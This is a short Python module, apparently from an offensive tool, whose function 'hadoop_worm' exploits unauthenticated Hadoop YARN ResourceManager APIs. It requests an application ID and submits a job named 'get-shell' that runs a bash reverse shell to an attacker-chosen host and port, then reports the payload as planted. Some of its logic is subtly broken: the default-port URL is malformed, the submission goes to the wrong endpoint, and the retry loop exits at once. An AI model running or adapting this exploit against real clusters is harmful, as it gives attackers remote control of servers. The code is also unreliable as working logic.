import requests
from intrack.lib.headers.headers_handler import user_agents

def hadoop_worm(ip, lhost, lport, ports=None):
    path = "/ws/v1/cluster/apps/new-application"
    protocols = ["http", "https"]

    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]

    for protocol in protocols:
        for port in ports:
            url = f"{protocol}://{ip}{port}{path}"
            headers = {
                'User-Agent': user_agents()
            }
            try:
                response = requests.get(url, headers=headers, timeout=10)
                app_id = response.json().get('application-id')
                if not app_id:
                    continue
                
                data = {
                    'application-id': app_id,
                    'application-name': 'get-shell',
                    'am-container-spec': {
                        'commands': {
                            'command': f'/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'
                        },
                    },
                    'application-type': 'YARN',
                }

                for _ in range(2):
                    requests.post(url, json=data, headers=headers)
                    print(f"Payload successfully planted {ip}")
                    return True
                print(lhost, lport)
            except requests.RequestException:
                print(f"Failed to exploit {ip}")
                continue
    return False